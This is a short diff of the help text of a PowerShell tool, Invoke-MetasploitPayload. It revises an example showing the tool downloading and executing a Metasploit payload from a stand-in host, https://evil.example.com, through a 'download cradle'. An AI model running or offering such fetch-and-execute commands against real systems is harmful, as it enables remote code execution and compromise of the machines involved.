@@ -39,13 +39,15 @@ This is the URL for the download cradle, by default it will be something
 like "https://evil.example.com/[Random Chars]"
 
 .EXAMPLE
-Connects to a URL at evil.example.com to download the payload
-
-PS> Invoke-MetasploitPayload -url https://evil.example.com/2k1isEdsl
+PS C:\>Invoke-MetasploitPayload -url https://evil.example.com/2k1isEdsl
+Downloads and executes a Metasploit payload located at https://evil.example.com/2k1isEdsl
 
 
 .NOTES
 You can use the "-verbose" option for verbose output.
+
+.LINK
+Github: https://github.com/jaredhaight/Invoke-MetasploitPayload
 
 #>
 
